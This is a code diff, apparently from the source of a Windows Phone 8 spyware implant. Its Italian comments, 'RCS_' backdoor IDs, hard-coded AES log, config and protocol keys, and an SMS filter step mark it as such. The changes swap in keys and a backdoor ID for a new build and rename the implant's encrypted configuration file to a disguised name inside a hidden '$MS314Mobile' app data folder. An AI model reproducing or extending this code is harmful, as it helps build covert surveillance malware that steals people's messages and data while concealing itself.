@@ -79,12 +79,23 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
 	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };
 	***/
 
+#ifdef _DEBUG
 	//wp8 v3 su castore
-	/*
-	BYTE LogKey[] = { 0x14, 0x78, 0xbe, 0x89, 0xbf, 0x52, 0x47, 0x45, 0x28, 0x8c, 0xa5, 0xff, 0xa1, 0x23, 0x68, 0x78 };
-	BYTE ConfKey[] = { 0x94, 0xbf, 0x39, 0x0a, 0xb8, 0xbb, 0x53, 0x42, 0x78, 0x6f, 0xa3, 0x28, 0xbd, 0x91, 0x7a, 0x15 };
+	
+	//BYTE LogKey[] = { 0x14, 0x78, 0xbe, 0x89, 0xbf, 0x52, 0x47, 0x45, 0x28, 0x8c, 0xa5, 0xff, 0xa1, 0x23, 0x68, 0x78 };
+	//BYTE ConfKey[] = { 0x94, 0xbf, 0x39, 0x0a, 0xb8, 0xbb, 0x53, 0x42, 0x78, 0x6f, 0xa3, 0x28, 0xbd, 0x91, 0x7a, 0x15 };
+	//BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };
+
+
+
+//wp8 v4 su castore
+	
+	BYTE LogKey[] =   { 0x9b, 0xd8, 0xd5, 0x0a, 0xb7, 0xe6, 0x3c, 0xa5, 0xca, 0x4e, 0x24, 0x81, 0x86, 0xe2, 0xfe, 0x63 };
+	BYTE ConfKey[] =  { 0x51, 0x24, 0xed, 0xe9, 0x6a, 0xd5, 0x03, 0x03, 0xe5, 0x91, 0xdf, 0x43, 0xe6, 0xfe, 0xe6, 0x7c };
 	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };
-	*/
+
+#endif		
+ 
 
 	//wp8 v1 polluce
 	// "logkey": "adbOtfWh7p77a6J_88VUY2Vrq2D1CTml",
@@ -106,9 +117,12 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
  -> SIGNATURE: 0x66, 0x3b, 0xa6, 0x70, 0x50, 0x2a, 0x7b, 0xe4, 0x68, 0xf7, 0x00, 0x79, 0xfb, 0x69, 0xee, 0xfd c405e69ca97a5853146f6612a74d9aec
  */
 
+/*
+	//Polluce v2 RCS_0000000308
 	BYTE LogKey[] = { 0x11, 0xbd, 0xeb, 0x67, 0x85, 0xd0, 0xd3, 0x05, 0xac, 0x56, 0x15, 0x77, 0x44, 0x68, 0x67, 0xee };
 	BYTE ConfKey[] = { 0x4c, 0xc0, 0x5a, 0x5d, 0x1b, 0xb5, 0x3d, 0x18, 0x2c, 0x2c, 0x4a, 0x64, 0x82, 0x02, 0x6e, 0xe6 };
 	BYTE ProtoKey[] = { 0x66, 0x3b, 0xa6, 0x70, 0x50, 0x2a, 0x7b, 0xe4, 0x68, 0xf7, 0x00, 0x79, 0xfb, 0x69, 0xee, 0xfd };
+*/
 
 	/*
 	 -> LOGKEY   : 1478be89bf524745288ca5ffa12368789d4744c37194a3dad9cfebf4e49b82ea
@@ -118,33 +132,40 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
 	
 	//g_hInstance = hInstance;
 /*****/
+#ifdef _DEBUG
 	// Configurazione artificiale di alcune variabili
+	
 	ZeroMemory(g_AesKey, 32);
-	ZeroMemory(g_Challenge, 32);
 	ZeroMemory(g_ConfKey, 32);
-
-	ZeroMemory(g_BackdoorID, 16);
-	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));
+	ZeroMemory(g_Challenge, 32);
+	
 
 	CopyMemory(g_AesKey, LogKey, 16);
-	CopyMemory(g_Challenge, ProtoKey, 16);
 	CopyMemory(g_ConfKey, ConfKey, 16);
-	/////CopyMemory(g_BackdoorID, "RCS_0000000033", strlen("RCS_0000000xxx"));
+	CopyMemory(g_Challenge, ProtoKey, 16);
 	
+	
+
+	ZeroMemory(g_BackdoorID, 16);
 	//wp8 v3 castore
 	//CopyMemory(g_BackdoorID, "RCS_0000001343", strlen("RCS_0000001343"));
-							    
-	//wp8 polluce
-	CopyMemory(g_BackdoorID, "RCS_0000000308", strlen("RCS_0000000308"));
 
-	CopyMemory(g_ConfName, L"conf.json.bin", WideLen(L"conf.json.bin"));
-	//CopyMemory(g_ConfName, L"c.bin", WideLen(L"c.bin"));
+	//wp8 v4 castore
+	CopyMemory(g_BackdoorID, "RCS_0000001611", strlen("RCS_0000001611"));
+							    
+	//wp8 v2 polluce
+    //CopyMemory(g_BackdoorID, "RCS_0000000308", strlen("RCS_0000000308"));
+
+	//ZeroMemory(g_ConfName,WideLen(L"cptm511.dql"));
+	//CopyMemory(g_ConfName, L"cptm511.dql", WideLen(L"cptm511.dql"));
+
+#endif
 /****/
 	// Fine configurazione artificiale
 
 
 	// Installiamo la DLL
-	pRegister RegisterFunction;
+///	pRegister RegisterFunction;
 
 	ADDDEMOMESSAGE(L"SMS Filter... ");
 /***
@@ -252,19 +273,20 @@ int mornellaStart(void)
 	*/
 		
 
-	COPYFILE2_EXTENDED_PARAMETERS copyParams = {
-      sizeof(copyParams), COPY_FILE_FAIL_IF_EXISTS, NULL, NULL, NULL
-   };
+		COPYFILE2_EXTENDED_PARAMETERS copyParams = {
+		  sizeof(copyParams), COPY_FILE_FAIL_IF_EXISTS, NULL, NULL, NULL
+	   };
 
 	   CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\", NULL);
 
 	   //vedere perche' in release il file dovrebbe chiamarsi cptm511.dql
-	   HRESULT  hCF=CopyFile2(L".\\conf.json.bin",L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\conf.json.bin",  &copyParams);
+	   HRESULT  hCF=CopyFile2(L".\\cptm511.dql",L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\cptm511.dql",  &copyParams);
+			   
 
 #ifdef _DEBUG
 	   if (hCF == HRESULT_FROM_WIN32(ERROR_FILE_EXISTS))
 	   {
-		 OutputDebugString(L"Il file è gia' presente per cui non lo sostituisco");
+		 OutputDebugString(L"Il file di Configurazione è gia' presente per cui non lo sostituisco");
 	   }
 	   if (hCF == S_OK)
 	   {
